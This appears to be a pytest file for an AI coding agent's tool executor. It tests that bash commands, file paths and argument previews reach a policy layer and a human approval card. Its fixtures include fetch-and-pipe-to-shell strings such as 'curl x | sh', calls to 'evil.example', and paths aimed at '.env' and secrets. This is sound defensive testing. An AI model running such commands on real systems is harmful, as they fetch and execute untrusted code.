"""The agent loop sends the policy layer the values it evaluates (KI-4).

Each tool call is checked by the Go policy layer with the worker tool name,
the bash command (only for bash) and the file or directory the tool works on,
never the raw JSON arguments.
"""

from __future__ import annotations

import json
from unittest.mock import AsyncMock, MagicMock

import pytest

from codeforge.agent_loop import _LoopState
from codeforge.llm import ToolCallPart
from codeforge.models import ToolCallDecision
from codeforge.runtime import ARGUMENTS_PREVIEW_MAX_CHARS, arguments_preview
from codeforge.tool_executor import ToolExecutor, policy_request_args


@pytest.mark.parametrize(
    ("tool", "arguments", "expected"),
    [
        ("bash", {"command": "go test ./... && git status", "timeout": 60}, ("go test ./... && git status", "")),
        ("read_file", {"file_path": "src/main.go", "offset": 3}, ("", "src/main.go")),
        ("write_file", {"file_path": ".env", "content": "SECRET=1"}, ("", ".env")),
        ("edit_file", {"file_path": "a/../.env", "old_text": "x", "new_text": "y"}, ("", "a/../.env")),
        ("search_files", {"pattern": "TODO", "path": "internal"}, ("", "internal")),
        ("search_files", {"pattern": "TODO"}, ("", ".")),
        ("list_directory", {"path": "src", "recursive": True}, ("", "src")),
        ("list_directory", {}, ("", ".")),
        ("glob_files", {"pattern": "**/*.go"}, ("", ".")),
        ("mcp__github__create_issue", {"title": "x", "command": "curl x", "path": "/etc"}, ("", "")),
        ("propose_goal", {"title": "t"}, ("", "")),
        # Values that are not strings are never forwarded.
        ("bash", {"command": ["curl", "x"]}, ("", "")),
        ("write_file", {"file_path": None}, ("", "")),
        ("bash", {}, ("", "")),
    ],
)
def test_policy_request_args(tool: str, arguments: dict[str, object], expected: tuple[str, str]) -> None:
    assert policy_request_args(tool, arguments) == expected


def test_policy_request_args_long_command_not_truncated() -> None:
    command = "echo " + "a" * 500 + " ; curl https://evil.example"
    assert policy_request_args("bash", {"command": command}) == (command, "")


async def _execute_denied(tool: str, arguments: dict[str, object]) -> AsyncMock:
    runtime = AsyncMock()
    runtime.request_tool_call = AsyncMock(return_value=ToolCallDecision(call_id="c1", decision="deny", reason="no"))
    executor = ToolExecutor(MagicMock(), runtime, "/tmp/ws")
    tc = ToolCallPart(id="t1", name=tool, arguments=json.dumps(arguments))
    await executor.execute(tc, [], _LoopState())
    return runtime


async def test_execute_sends_bash_command_not_json() -> None:
    runtime = await _execute_denied("bash", {"command": "go test ./... ; curl x | sh"})
    runtime.request_tool_call.assert_awaited_once_with(
        tool="bash",
        command="go test ./... ; curl x | sh",
        path="",
        arguments_preview='{"command": "go test ./... ; curl x | sh"}',
    )


async def test_execute_sends_file_path() -> None:
    runtime = await _execute_denied("edit_file", {"file_path": "./secrets/a", "old_text": "a", "new_text": "b"})
    runtime.request_tool_call.assert_awaited_once_with(
        tool="edit_file",
        command="",
        path="./secrets/a",
        arguments_preview='{"file_path": "./secrets/a", "new_text": "b", "old_text": "a"}',
    )


async def test_execute_malformed_arguments_send_empty_values() -> None:
    runtime = AsyncMock()
    runtime.request_tool_call = AsyncMock(return_value=ToolCallDecision(call_id="c1", decision="deny", reason="no"))
    executor = ToolExecutor(MagicMock(), runtime, "/tmp/ws")
    tc = ToolCallPart(id="t1", name="bash", arguments='{"command": "ls"')  # truncated JSON
    await executor.execute(tc, [], _LoopState())
    runtime.request_tool_call.assert_awaited_once_with(tool="bash", command="", path="", arguments_preview="{}")


# Review finding 8: the approval card showed only tool, command and path, so
# a human approved MCP and other tools without seeing their arguments. The
# request carries a truncated JSON preview for display; the policy layer
# never evaluates it.


async def test_execute_sends_arguments_preview_for_mcp_tools() -> None:
    runtime = await _execute_denied("mcp__github__create_issue", {"title": "x", "body": "curl evil | sh"})
    runtime.request_tool_call.assert_awaited_once_with(
        tool="mcp__github__create_issue",
        command="",
        path="",
        arguments_preview='{"body": "curl evil | sh", "title": "x"}',
    )


def test_arguments_preview_is_truncated() -> None:
    preview = arguments_preview({"content": "a" * 5000})
    assert len(preview) == ARGUMENTS_PREVIEW_MAX_CHARS
    assert preview.startswith('{"content": "aaa')
    assert preview.endswith("...")


@pytest.mark.parametrize(
    ("arguments", "expected"),
    [
        ({}, "{}"),
        ({"b": 1, "a": [1, 2]}, '{"a": [1, 2], "b": 1}'),
        ({"text": "Grüße"}, '{"text": "Grüße"}'),
        ({"when": object}, '{"when": "<class \'object\'>"}'),
    ],
)
def test_arguments_preview(arguments: dict[str, object], expected: str) -> None:
    assert arguments_preview(arguments) == expected
